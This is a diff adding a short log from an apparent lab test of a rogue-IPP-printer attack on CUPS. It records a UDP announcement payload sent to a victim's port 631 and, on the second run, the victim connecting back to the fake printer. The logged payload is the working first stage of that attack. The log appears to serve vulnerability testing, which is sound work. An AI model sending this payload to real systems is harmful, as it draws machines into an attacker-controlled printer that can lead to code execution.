@@ -1,0 +1,11 @@
+2026-10-28 11:47:18,033 INFO fake IPP printer listening on tcp/8631
+2026-10-28 11:47:19,035 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/RoguePrinter "Lab" "Rogue Printer"\n'
+2026-10-28 11:47:22,111 INFO watching 10 s for the victim to connect back ...
+2026-10-28 11:47:32,123 INFO RESULT: no TCP connection from the victim seen
+2026-10-28 11:54:46,989 INFO fake IPP printer listening on tcp/8631
+2026-10-28 11:54:47,992 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/RoguePrinter "Lab" "Rogue Printer"\n'
+2026-10-28 11:54:48,045 WARNING CALLBACK: victim 172.20.0.10:51380 -> fake printer | POST /printers/RoguePrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:54:48,046 WARNING CALLBACK: victim 172.20.0.10:51384 -> fake printer | POST /printers/RoguePrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:54:48,046 WARNING CALLBACK: victim 172.20.0.10:51392 -> fake printer | POST /printers/RoguePrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:54:49,043 INFO watching 10 s for the victim to connect back ...
+2026-10-28 11:54:59,076 WARNING RESULT: victim 172.20.0.10 opened TCP connection to 172.20.0.1:8631
